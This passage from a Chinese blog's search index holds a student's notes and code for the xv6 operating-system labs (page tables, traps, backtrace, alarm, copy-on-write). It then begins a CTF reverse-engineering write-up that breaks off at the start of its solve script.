class="type">pagetable_t</span> pagetable)</span> &#123;</span><br><span class="line">  <span class="comment">// your code here</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  vmprint_recursive(pagetable, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint_recursive</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level, uint64 base_va)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V)&#123;</span><br><span class="line">      uint64 va = base_va + (i &lt;&lt; PXSHIFT(level));</span><br><span class="line">      uint64 pa = PTE2PA(pte);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Print indentation based on level</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= level; j++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// printf(&quot;0x%016lx: pte 0x%016lx pa 0x%016lx\n&quot;,</span></span><br><span class="line">      <span class="comment">//   va, (uint64)pte, (uint64)pa);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p: pte %p pa %p\n&quot;</span>, (<span class="type">void</span>*)va, (<span class="type">void</span>*)pte, (<span class="type">void</span>*)pa);</span><br><span class="line"> </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// If this is not a leaf page (no R, W, or X bits set), recurse</span></span><br><span class="line">      <span class="keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="number">0</span>)&#123;</span><br><span class="line">        vmprint_recursive((<span class="type">pagetable_t</span>)pa, level + <span class="number">1</span>, va);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个没过测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(LAB_PGTBL) || defined(SOL_MMAP) || defined(SOL_COW)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmprint_helper</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *dots;</span><br><span class="line">  <span class="keyword">switch</span> (level)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    dots = <span class="string">&quot; ..&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    dots = <span class="string">&quot; .. ..&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    dots = <span class="string">&quot; .. .. ..&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    dots = <span class="string">&quot;............&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span> (pte &amp; PTE_V)</span><br><span class="line">    &#123;</span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      uint64 child_va = va + (i &lt;&lt; (<span class="number">9</span> * (<span class="number">2</span> - level) + <span class="number">12</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s%p: pte %p pa %p\n&quot;</span>, dots, (<span class="type">void</span> *)child_va, (<span class="type">void</span> *)pte, (<span class="type">void</span> *)child);</span><br><span class="line">      <span class="keyword">if</span> (level &lt; <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        vmprint_helper((<span class="type">pagetable_t</span>)child, child_va, level + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span> &#123;</span><br><span class="line">  <span class="comment">// your code here</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">  vmprint_helper(pagetable, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="4-超级页"><a href="#4-超级页" class="headerlink" title="4.超级页"></a>4.超级页</h2><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250914214523659.png" alt="image-20250914214523659"></p><p>好难。。。（失败</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250915175831830.png" alt="image-20250915175831830"></p><p>关于vm.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"> 内核页表管理函数</span><br><span class="line"></span><br><span class="line">__kvmmake()__ - 创建内核的直接映射页表</span><br><span class="line"></span><br><span class="line">- 分配并初始化内核页表</span><br><span class="line">- 映射各种硬件设备（UART、VIRTIO、PLIC）</span><br><span class="line">- 映射内核代码段（只读可执行）和数据段（读写）</span><br><span class="line">- 映射 trampoline 页用于陷入/退出处理</span><br><span class="line">- 为每个进程分配内核栈</span><br><span class="line"></span><br><span class="line">__kvminit()__ - 初始化内核页表</span><br><span class="line"></span><br><span class="line">- 调用 kvmmake() 创建内核页表</span><br><span class="line">- 设置全局内核页表指针</span><br><span class="line"></span><br><span class="line">__kvminithart()__ - 切换到内核页表</span><br><span class="line"></span><br><span class="line">- 刷新 TLB（转换后备缓冲区）</span><br><span class="line">- 设置 satp 寄存器指向内核页表</span><br><span class="line">- 启用分页</span><br><span class="line"></span><br><span class="line">## 页表遍历和查找函数</span><br><span class="line"></span><br><span class="line">__walk()__ - 遍历页表查找 PTE（页表项）</span><br><span class="line"></span><br><span class="line">- 根据虚拟地址查找对应的页表项</span><br><span class="line">- 支持三级页表遍历（RISC-V Sv39 方案）</span><br><span class="line">- alloc 参数控制是否分配新的页表页</span><br><span class="line"></span><br><span class="line">__walkaddr()__ - 查找虚拟地址对应的物理地址</span><br><span class="line"></span><br><span class="line">- 只能用于查找用户页</span><br><span class="line">- 检查 PTE_V（有效位）和 PTE_U（用户位）</span><br><span class="line"></span><br><span class="line">## 内存映射函数</span><br><span class="line"></span><br><span class="line">__kvmmap()__ - 添加内核页表映射</span><br><span class="line"></span><br><span class="line">- 仅在启动时使用</span><br><span class="line">- 不刷新 TLB 或启用分页</span><br><span class="line">- 调用 mappages() 实现实际映射</span><br><span class="line"></span><br><span class="line">__mappages()__ - 创建页表映射</span><br><span class="line"></span><br><span class="line">- 为虚拟地址创建指向物理地址的 PTE</span><br><span class="line">- va 和 size 必须页对齐</span><br><span class="line">- 返回 0 表示成功，-1 表示失败</span><br><span class="line"></span><br><span class="line">## 用户页表管理函数</span><br><span class="line"></span><br><span class="line">__uvmcreate()__ - 创建空的用户页表</span><br><span class="line"></span><br><span class="line">- 分配并初始化用户页表</span><br><span class="line">- 返回 0 表示内存不足</span><br><span class="line"></span><br><span class="line">__uvmunmap()__ - 取消用户页表映射</span><br><span class="line"></span><br><span class="line">- 移除从 va 开始的 npages 个映射</span><br><span class="line">- do_free 参数控制是否释放物理内存</span><br><span class="line"></span><br><span class="line">__uvmalloc()__ - 分配用户内存</span><br><span class="line"></span><br><span class="line">- 增长进程内存从 oldsz 到 newsz</span><br><span class="line">- 分配物理内存并创建页表映射</span><br><span class="line"></span><br><span class="line">__uvmdealloc()__ - 释放用户内存</span><br><span class="line"></span><br><span class="line">- 缩小进程内存从 oldsz 到 newsz</span><br><span class="line">- 调用 uvmunmap() 释放内存</span><br><span class="line"></span><br><span class="line">__freewalk()__ - 递归释放页表页</span><br><span class="line"></span><br><span class="line">- 递归释放所有页表页</span><br><span class="line">- 所有叶映射必须已移除</span><br><span class="line"></span><br><span class="line">__uvmfree()__ - 释放用户内存和页表</span><br><span class="line"></span><br><span class="line">- 释放用户内存页</span><br><span class="line">- 释放页表页</span><br><span class="line"></span><br><span class="line">## 进程内存操作函数</span><br><span class="line"></span><br><span class="line">__uvmcopy()__ - 复制进程内存</span><br><span class="line"></span><br><span class="line">- 将父进程内存复制到子进程</span><br><span class="line">- 复制页表和物理内存</span><br><span class="line">- 用于 fork() 系统调用</span><br><span class="line"></span><br><span class="line">__uvmclear()__ - 清除用户访问权限</span><br><span class="line"></span><br><span class="line">- 将 PTE 标记为无效的用户访问</span><br><span class="line">- 用于 exec() 的用户栈保护页</span><br><span class="line"></span><br><span class="line">## 内核与用户空间数据复制函数</span><br><span class="line"></span><br><span class="line">__copyout()__ - 从内核复制到用户空间</span><br><span class="line"></span><br><span class="line">- 复制 len 字节从内核 src 到用户 dstva</span><br><span class="line">- 处理页错误和权限检查</span><br><span class="line"></span><br><span class="line">__copyin()__ - 从用户空间复制到内核</span><br><span class="line"></span><br><span class="line">- 复制 len 字节从用户 srcva 到内核 dst</span><br><span class="line">- 处理页错误</span><br><span class="line"></span><br><span class="line">__copyinstr()__ - 从用户空间复制字符串到内核</span><br><span class="line"></span><br><span class="line">- 复制以 null 结尾的字符串</span><br><span class="line">- 直到遇到 &#x27;\0&#x27; 或达到 max</span><br><span class="line"></span><br><span class="line">## 页错误处理函数</span><br><span class="line"></span><br><span class="line">__vmfault()__ - 处理页错误</span><br><span class="line"></span><br><span class="line">- 为延迟分配的内存分配和映射物理页</span><br><span class="line">- 用于 sys_sbrk() 的懒分配机制</span><br><span class="line"></span><br><span class="line">__ismapped()__ - 检查地址是否已映射</span><br><span class="line"></span><br><span class="line">- 检查虚拟地址是否已有有效的页表映射</span><br><span class="line"></span><br><span class="line">## 调试和工具函数</span><br><span class="line"></span><br><span class="line">__vmprint()__ - 打印页表结构（条件编译）</span><br><span class="line"></span><br><span class="line">- 递归打印页表层次结构</span><br><span class="line">- 用于调试和实验</span><br><span class="line"></span><br><span class="line">__pgpte()__ - 获取页表项（条件编译）</span><br><span class="line"></span><br><span class="line">- 返回指定虚拟地址的 PTE</span><br><span class="line"></span><br><span class="line">这个文件实现了 xv6 操作系统的完整虚拟内存管理系统，包括内核和用户空间的页表管理、内存分配、进程间内存复制以及内核与用户空间的数据传输等功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Lab4-traps"><a href="#Lab4-traps" class="headerlink" title="Lab4:traps"></a>Lab4:traps</h1><p>由于2025年的实验代码没有写好，从lab4改用2024年的版本</p><h2 id="1-RISC-V-assembly"><a href="#1-RISC-V-assembly" class="headerlink" title="1.RISC-V assembly"></a>1.RISC-V assembly</h2><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917112445551.png" alt="image-20250917112445551"></p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917112816760.png" alt="image-20250917112816760"></p><p>哪些寄存器包含传递给函数的参数？例如，main 调用 printf 时，哪个寄存器存储 13？<br>a1存储12，a2存储13，<code>a1</code>、<code>a2</code> 包含函数参数。<br>在 main 的汇编代码中， f 函数的调用在哪里？ g 函数的调用在哪里？<br>f 和 g 的调用参数由于都是编译期常数，都被编译器直接计算了，a1 里存的 12 就是 f(8)+1 的计算结果。<br>printf 函数位于哪个地址？<br>6bc<br>在 jalr 到 printf 的 main 中，寄存器 ra 中包含什么值？<br>ra&#x3D;0x34<br>unsigned int i &#x3D; 0x00646c72;<br>printf(“H%x Wo%s”, 57616, (char *) &amp;i);<br>输出是什么<br>He110 World<br>在以下代码中， ‘y&#x3D;’ 之后将要打印什么？（注意：答案不是特定值。）为什么会这样？<br>printf(“x&#x3D;%d y&#x3D;%d”, 3);<br>printf 会继续在调用栈上“读”一个不存在的参数位置。y 会打印 a2 的值，因为 a2 是第三个函数传入参数。</p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917124924399.png" alt="image-20250917124924399"></p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917125423570.png" alt="image-20250917125423570"></p><h2 id="2-backtrace"><a href="#2-backtrace" class="headerlink" title="2.backtrace"></a>2.backtrace</h2><p>在 <code>kernel/printf.c</code> 中实现一个 <code>backtrace()</code> 函数,在 <code>sys_sleep</code> 中插入对该函数的调用</p><p>riscv.h中添加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64</span><br><span class="line"><span class="title function_">r_fp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mv %0, s0&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>defs.h中添加backtrace()的声明</p><p>printf.h中写backtrace函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">backtrace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 fp = r_fp();</span><br><span class="line">  uint64 page = PGROUNDDOWN(fp);</span><br><span class="line">  <span class="keyword">while</span> (PGROUNDDOWN(fp) == page)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">void</span> *)(*(uint64 *)(fp - <span class="number">8</span>)));</span><br><span class="line">    fp = *(uint64 *)(fp - <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-alarmtest"><a href="#3-alarmtest" class="headerlink" title="3.alarmtest"></a>3.alarmtest</h2><p>添加sysalarm和sysreturn 系统调用</p><p>trap.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果是定时器中断，可能需要抢占 CPU 或处理 alarm</span></span><br><span class="line">  <span class="keyword">if</span> (which_dev == <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;alarm_interval &gt; <span class="number">0</span>) <span class="comment">// 进程设置了 alarm</span></span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;alarm_ticks--; <span class="comment">// 每次 timer interrupt 减少计数</span></span><br><span class="line">      <span class="keyword">if</span> (p-&gt;alarm_ticks == <span class="number">0</span> &amp;&amp; p-&gt;in_handler == <span class="number">0</span>)</span><br><span class="line">      &#123; </span><br><span class="line">        <span class="comment">// alarm 到期且当前未在信号处理函数中</span></span><br><span class="line">        <span class="comment">// 保存当前 trapframe，方便返回时恢复</span></span><br><span class="line">        memmove(&amp;p-&gt;sig_trapframe, p-&gt;trapframe, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">        p-&gt;in_handler = <span class="number">1</span>; <span class="comment">// 标记进入信号处理函数</span></span><br><span class="line">        p-&gt;alarm_ticks = p-&gt;alarm_interval; <span class="comment">// 重置 alarm 计数</span></span><br><span class="line">        p-&gt;trapframe-&gt;epc = (uint64)p-&gt;alarm_handler; <span class="comment">// 设置 epc 指向处理函数</span></span><br><span class="line">        <span class="comment">// 这样返回用户态时，会执行 alarm_handler</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    yield(); <span class="comment">// 抢占 CPU，把 CPU 分给其他进程</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917144438724.png" alt="image-20250917144438724"></p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250917144954559.png" alt="image-20250917144954559"></p><h2 id="Lab5-Copy-on-write"><a href="#Lab5-Copy-on-write" class="headerlink" title="Lab5: Copy-on-write"></a>Lab5: Copy-on-write</h2><p>实现写时复制（Copy-on-Write）机制需要修改的文件和函数</p><ol><li>主要需要修改的文件：</li></ol><p><strong>kernel&#x2F;kalloc.c</strong> - 修改fork函数：</p><ul><li>将当前的uvmcopy&#96;调用改为共享页面而不是复制页面</li><li>设置COW标志位</li></ul><p><strong>kernel&#x2F;vm.c</strong> - 修改内存管理函数：</p><ul><li>修改<code>uvmcopy</code>函数使其共享页面而不是复制物理内存</li><li>添加COW页面错误处理函数</li><li>实现实际的页面复制逻辑</li></ul><p><strong>kernel&#x2F;trap.c</strong> - 添加页面错误处理：</p><ul><li>在<code>usertrap</code>函数中添加对页面错误的检测和处理</li><li>识别COW相关的页面错误（存储页面错误）</li></ul><p><strong>kernel&#x2F;defs.h</strong> - 添加函数声明：</p><ul><li>添加COW相关的新函数声明</li></ul><ol start="2"><li>需要实现的关键功能：</li></ol><p>__引用计数机制__：</p><ul><li>需要创建一个全局的引用计数数组来跟踪每个物理页面的引用次数</li><li>在<code>kalloc.c</code>中添加引用计数管理</li></ul><p>__COW页面错误处理__：</p><ul><li>检测存储页面错误（scause &#x3D; 0x15）</li><li>检查页面是否为COW页面</li><li>如果是COW页面，则分配新页面并复制内容</li><li>更新页表项，移除COW标志</li></ul><p>__页面标志位__：</p><ul><li>使用PTE的保留位作为COW标志（例如PTE_RSW位）</li><li>定义<code>#define PTE_COW (1L &lt;&lt; 8)</code> 之类的标志</li></ul><ol start="3"><li><p>具体修改步骤：</p></li><li><p>__在riscv.h中添加COW标志__：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COW (1L &lt;&lt; 8) <span class="comment">// 自定义COW标志位</span></span></span><br></pre></td></tr></table></figure></li><li><p>__修改fork函数__：</p><ul><li>调用新的<code>uvmcowcopy</code>而不是<code>uvmcopy</code></li><li>新函数应该共享页面并设置COW标志</li></ul></li><li><p>__实现页面错误处理__：</p><ul><li>在<code>usertrap</code>中检测scause &#x3D;&#x3D; 0x15（存储页面错误）</li><li>调用COW处理函数</li></ul></li><li><p>__实现引用计数__：</p><ul><li>在<code>kalloc.c</code>中添加全局引用计数数组</li><li>修改<code>kalloc</code>和<code>kfree</code>来管理引用计数</li></ul></li><li><p>__修改uvmunmap__：</p><ul><li>在释放页面时正确处理引用计数</li></ul></li><li><p>关键数据结构：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在kalloc.c中添加</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="type">int</span> refcount[PHYSTOP / PGSIZE];</span><br><span class="line">&#125; refcount;</span><br></pre></td></tr></table></figure><ol start="5"><li>性能考虑：</li></ol><ul><li>使用自旋锁保护引用计数</li><li>优化COW处理路径，避免不必要的锁竞争</li><li>确保在错误情况下正确回滚</li></ul><p>这种实现方式可以显著减少fork操作的开销，因为只有在实际写入时才进行页面复制。</p><p>kalloc.c文件的改动：</p><ol><li>添加了引用计数数组<code>refcount[MAXPAGES]</code>到kmem结构中</li><li>定义了<code>pa2index</code>函数来将物理地址转换为引用计数数组的索引</li><li>修改了<code>freerange</code>函数来初始化引用计数</li><li>添加了<code>inc_ref</code>和<code>get_ref</code>函数来增加和获取引用计数</li><li>修改了<code>kfree</code>函数来使用引用计数而不是直接释放页面</li><li>修改了<code>kalloc</code>函数来初始化新分配页面的引用计数</li></ol><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250918151710088.png" alt="image-20250918151710088"></p><p><img src="/2025/09/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E8%B7%B5/image-20250918153728502.png" alt="image-20250918153728502"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LILCTF-Re&amp;Crypto</title>
      <link href="/2025/08/18/LILCTF-Re-Crypto/"/>
      <url>/2025/08/18/LILCTF-Re-Crypto/</url>
      
        <content type="html"><![CDATA[<p>好精彩的比赛😀虽然过程很艰难，收获还是很大的</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h2><p>apk先用jadx分析</p><p><img src="/2025/08/18/LILCTF-Re-Crypto/image-20250818083723427.png" alt="image-20250818083723427"></p><p>发现check函数在native层，并且找到了密文，解压分析ez_asm_hahaha.so</p><p>分析check函数逻辑：首先验证输入字符数是否为48，</p><p>第一次使用表 t对输入字节进行重排列，将重排列后的结果与表 t进行异或并且每次循环t与i进行异或，</p><p>第二次位旋转，每三字节一组，第一字节循环左移3位，第二字节循环右移1位，第三字节不变</p><p>第三次进行自定义base64编码</p><p>完整解题脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 